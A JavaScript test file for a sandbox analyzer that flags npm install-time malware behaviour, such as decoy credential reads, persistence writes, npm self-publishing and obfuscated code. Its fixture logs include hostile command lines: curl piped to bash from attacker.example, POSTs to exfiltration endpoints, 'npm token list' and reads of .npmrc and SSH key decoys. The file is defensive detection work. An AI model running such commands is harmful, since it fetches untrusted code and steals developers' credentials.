'use strict';

const { test, assert } = require('../test-utils');
const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');

function runSandboxAnalyzer2026Tests() {
  console.log('\n=== SANDBOX ANALYZER 2026 SIGNALS TESTS ===\n');

  test('ANALYZER-2026: honey_read fires CRITICAL when correlated with non-registry MOCK_HTTP', () => {
    const log = [
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc-decoy (t+100ms)',
      '[PRELOAD] MOCK_HTTP: https POST sfrclak.com:8000 / (t+200ms)'
    ].join('\n') + '\n';
    const r = analyzePreloadLog(log);
    const honey = r.findings.find(f => f.type === 'sandbox_honey_read');
    assert(honey, 'Expected sandbox_honey_read finding');
    assert(honey.severity === 'CRITICAL', 'Severity must be CRITICAL when outbound non-registry, got ' + honey.severity);
  });

  test('ANALYZER-2026: honey_read fires HIGH alone (no outbound)', () => {
    const log = '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.ssh/id_rsa-decoy (t+100ms)\n';
    const r = analyzePreloadLog(log);
    const honey = r.findings.find(f => f.type === 'sandbox_honey_read');
    assert(honey, 'Expected sandbox_honey_read finding');
    assert(honey.severity === 'HIGH', 'Severity must be HIGH without outbound, got ' + honey.severity);
  });

  test('ANALYZER-2026: honey_read negatif (no decoy file read)', () => {
    const log = '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc (t+100ms)\n';
    const r = analyzePreloadLog(log);
    const honey = r.findings.find(f => f.type === 'sandbox_honey_read');
    assert(!honey, 'No honey_read for non-decoy paths');
  });

  test('ANALYZER-2026: persistence_write fires CRITICAL on .bashrc', () => {
    const log = '[PRELOAD] FS_WRITE: /home/sandboxuser/.bashrc (t+150ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_persistence_write');
    assert(f, 'Expected sandbox_persistence_write finding');
    assert(f.severity === 'CRITICAL', 'Severity must be CRITICAL');
  });

  test('ANALYZER-2026: persistence_write fires on systemd user unit', () => {
    const log = '[PRELOAD] FS_WRITE: /home/sandboxuser/.config/systemd/user/persistence.service (t+150ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_persistence_write');
    assert(f, 'Expected sandbox_persistence_write finding for systemd user unit');
  });

  test('ANALYZER-2026: persistence_write negatif (write to /tmp)', () => {
    const log = '[PRELOAD] FS_WRITE: /tmp/install-cache.txt (t+50ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_persistence_write');
    assert(!f, 'No persistence_write for /tmp path');
  });

  test('ANALYZER-2026: execve_chain_depth fires on >=2 EXEC + curl URL', () => {
    const log = [
      '[PRELOAD] EXEC: spawn: node setup.js (t+100ms)',
      '[PRELOAD] EXEC: DANGEROUS spawn: curl -sL https://attacker.example/payload.sh | bash (t+200ms)'
    ].join('\n') + '\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_execve_chain_depth');
    assert(f, 'Expected sandbox_execve_chain_depth finding');
    assert(f.severity === 'HIGH', 'Severity must be HIGH');
  });

  test('ANALYZER-2026: execve_chain_depth negatif (single EXEC, no chain)', () => {
    const log = '[PRELOAD] EXEC: spawn: node setup.js (t+100ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_execve_chain_depth');
    assert(!f, 'No execve_chain_depth for single non-dangerous EXEC');
  });

  test('ANALYZER-2026: npm_self_invoke fires on npm publish during install', () => {
    const log = '[PRELOAD] EXEC: spawn: npm publish ./victim-package (t+500ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_npm_self_invoke');
    assert(f, 'Expected sandbox_npm_self_invoke finding');
    assert(f.severity === 'CRITICAL', 'Severity must be CRITICAL');
  });

  test('ANALYZER-2026: npm_self_invoke fires on npm token list', () => {
    const log = '[PRELOAD] EXEC: execSync: npm token list (t+500ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_npm_self_invoke');
    assert(f, 'Expected sandbox_npm_self_invoke finding for npm token');
  });

  test('ANALYZER-2026: npm_self_invoke negatif (npm install is not self-invoke)', () => {
    const log = '[PRELOAD] EXEC: spawn: npm install lodash (t+500ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_npm_self_invoke');
    assert(!f, 'No npm_self_invoke for plain npm install');
  });

  test('ANALYZER-2026: runtime_deobfuscation_executed fires on body >= 500', () => {
    const log = '[PRELOAD] NEW_FUNCTION: bodyLen=2048 argsCount=0 bodyStart=var _0xab=function() (t+250ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_runtime_deobfuscation_executed');
    assert(f, 'Expected sandbox_runtime_deobfuscation_executed finding');
    assert(f.severity === 'HIGH', 'Severity must be HIGH');
  });

  test('ANALYZER-2026: runtime_deobfuscation_executed negatif (small body)', () => {
    const log = '[PRELOAD] NEW_FUNCTION: bodyLen=42 argsCount=0 bodyStart=return 1+1 (t+10ms)\n';
    const r = analyzePreloadLog(log);
    const f = r.findings.find(x => x.type === 'sandbox_runtime_deobfuscation_executed');
    assert(!f, 'No runtime_deobfuscation for tiny body');
  });

  test('ANALYZER-2026: full Shai-Hulud-like log accumulates multiple signals', () => {
    const log = [
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc-decoy (t+50ms)',
      '[PRELOAD] FS_WRITE: /home/sandboxuser/.bashrc (t+100ms)',
      '[PRELOAD] EXEC: spawn: node setup.js (t+150ms)',
      '[PRELOAD] EXEC: DANGEROUS spawn: curl -sL https://attacker/payload | bash (t+200ms)',
      '[PRELOAD] EXEC: spawn: npm publish (t+300ms)',
      '[PRELOAD] NEW_FUNCTION: bodyLen=8192 argsCount=0 bodyStart=eval (t+350ms)',
      '[PRELOAD] MOCK_HTTP: https POST attacker.example /exfil (t+400ms)'
    ].join('\n') + '\n';
    const r = analyzePreloadLog(log);
    const types = r.findings.map(f => f.type);
    assert(types.includes('sandbox_honey_read'), 'Should fire honey_read');
    assert(types.includes('sandbox_persistence_write'), 'Should fire persistence_write');
    assert(types.includes('sandbox_execve_chain_depth'), 'Should fire execve_chain_depth');
    assert(types.includes('sandbox_npm_self_invoke'), 'Should fire npm_self_invoke');
    assert(types.includes('sandbox_runtime_deobfuscation_executed'), 'Should fire runtime_deobfuscation_executed');
  });
}

module.exports = { runSandboxAnalyzer2026Tests };
